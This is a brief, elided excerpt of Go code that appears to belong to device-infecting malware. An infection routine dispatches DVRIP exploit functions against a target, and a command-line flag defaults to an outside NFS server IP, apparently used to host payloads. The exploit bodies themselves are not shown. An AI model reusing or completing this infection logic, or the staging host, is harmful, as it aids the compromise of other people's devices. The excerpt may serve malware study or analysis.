...
func infectFunction(target string) {
	...
	if DynamicPortFetch {
		dvripWebExploitFunction(target)
		return
	}

	dvripExploitFunction(target)
}
...
func main() {
	...
	pflag.StringVarP(&MountPoint, "mount-point", "m", "/srv/nfs/share", "Mount path")
	pflag.StringArrayVarP(&MountServers, "nfs-servers", "n", []string{"45.90.163.37"}, "List of NFS servers to use")
